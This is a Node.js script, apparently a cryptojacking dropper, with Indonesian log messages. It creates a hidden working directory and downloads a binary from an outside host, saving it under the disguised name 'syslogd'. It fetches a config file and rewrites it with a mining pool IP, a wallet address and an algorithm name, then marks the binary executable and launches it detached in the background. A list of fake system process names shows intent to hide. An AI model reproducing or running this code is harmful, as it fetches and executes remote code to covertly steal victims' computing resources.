const fs = require('fs');
const path = require('path');
const { spawn, execSync } = require('child_process');
const axios = require('axios');
const crypto = require('crypto');

const DEBUG = true;

const URL_GENZO = "https://blogspotgenzo.site/UCOK";
const URL_CONFIG = "https://blogspotgenzo.site/config.json";

const FAKE_SYSTEM_NAMES = [
  "systemd-logind", "dbus-daemon", "kworker/0:1-events",
  "sshd", "cron", "rsyslogd", "containerd-shim"
];

const WORKDIR = path.join(process.cwd(), '.' + crypto.randomBytes(4).toString('hex'));
fs.mkdirSync(WORKDIR, { recursive: true });
process.chdir(WORKDIR);

const FILE_GENZO = "syslogd";
const FILE_CONFIG = "configd.json";
const PID_FILE = path.join(WORKDIR, 'daemon.pid');
const LOG_FILE = path.join(WORKDIR, 'daemon.log');

function log(msg) {
  const message = `[${new Date().toISOString()}] ${msg}`;
  fs.appendFileSync(LOG_FILE, message + '\n');
  if (DEBUG) console.log(message);
}

async function downloadFile(url, outputPath) {
  try {
    const response = await axios.get(url, { responseType: 'arraybuffer', timeout: 15000 });
    fs.writeFileSync(outputPath, response.data);
    log(`Downloaded: ${outputPath}`);
  } catch (error) {
    log(`Gagal download ${url}: ${error.message}`);
  }
}

function editConfig(filePath) {
  try {
    let data = fs.readFileSync(filePath, 'utf8');
    data = data.replace(/"tua"/g, '"165.232.87.223:443"')
               .replace(/"wulet"/g, '"mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Danis"')
               .replace(/"meki"/g, '"power2b"');
    fs.writeFileSync(filePath, data);
    log("Config updated.");
  } catch (e) {
    log("Edit config error: " + e.message);
  }
}

function runBinary() {
  log("Menjalankan binary...");

  const proc = spawn(`./${FILE_GENZO}`, ['-c', FILE_CONFIG], {
    detached: true,
    stdio: 'ignore',
    shell: true
  });

  proc.unref();
  log(`Binary berjalan dengan PID: ${proc.pid}`);
  return proc;
}

(async () => {
  if (!fs.existsSync(FILE_GENZO)) await downloadFile(URL_GENZO, FILE_GENZO);
  if (!fs.existsSync(FILE_CONFIG)) {
    await downloadFile(URL_CONFIG, FILE_CONFIG);
    editConfig(FILE_CONFIG);
  }

  fs.chmodSync(FILE_GENZO, 0o755);

  const proc = runBinary();

  fs.writeFileSync(PID_FILE, proc.pid.toString());
  log(`Daemon berjalan dengan PID: ${proc.pid}`);
})();
